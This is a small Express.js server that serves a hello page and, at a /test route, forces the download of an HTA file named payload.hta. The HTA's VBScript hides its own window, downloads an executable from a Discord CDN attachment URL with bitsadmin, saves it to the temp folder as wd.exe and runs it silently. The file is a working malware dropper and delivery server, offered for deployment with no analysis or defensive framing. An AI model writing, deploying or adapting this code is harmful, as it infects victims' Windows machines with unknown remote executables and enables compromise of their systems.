const express = require('express');
const app = express();

// Your existing route (shows "hello")
app.get('/', (req, res) => {
    res.send('hello');
});

// The /test route that serves your .hta payload
app.get('/test', (req, res) => {
    const htaPayload = `
<html>
<body>
<script language="VBScript">
Window.ResizeTo 0,0:Window.MoveTo -5000,-5000

Dim shell: Set shell = CreateObject("WScript.Shell")
Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
Dim temp: temp = fso.GetSpecialFolder(2)

shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1520291709915758602/1533622635571843256/navi.exe?ex=6a7128e1&is=6a6fd761&hm=fcf25c9a4d5b834a47acbcd099ca414c5f61d28a7b5cd272109430aba2a71d98&"" """ & temp & "\wd.exe""", 0, True

If fso.FileExists(temp & "\wd.exe") Then
    shell.Run """" & temp & "\wd.exe""", 0, False
End If

window.close()
</script>
</body>
</html>`;

    // Force download as .hta file
    res.setHeader('Content-Type', 'application/hta');
    res.setHeader('Content-Disposition', 'attachment; filename="payload.hta"');
    res.send(htaPayload);
});

// Railway uses PORT environment variable
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server running on port ${port}`));
